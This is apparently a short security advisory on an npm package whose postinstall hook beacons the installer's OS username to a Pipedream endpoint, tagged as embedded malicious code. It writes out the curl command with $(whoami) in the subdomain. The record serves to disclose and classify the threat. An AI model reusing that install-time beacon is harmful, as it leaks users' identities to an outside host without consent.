summary: postinstall beacon exfiltrates installer username to attacker-controlled Pipedream endpoint
details: package.json declares a postinstall lifecycle hook that runs curl against a URL of the form http://$(whoami).eodxy50gl486xrx.m.pipedream.net, encoding the installer's local OS username into the subdomain of an external request-inspection service. The package ships no other code, no main entry, and no functionality — its sole on-install effect is to phone home with the installer's identity. This is unconsented host-identifier exfiltration executed automatically by `npm install`, consistent with a dependency-confusion probe or reconnaissance beacon.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
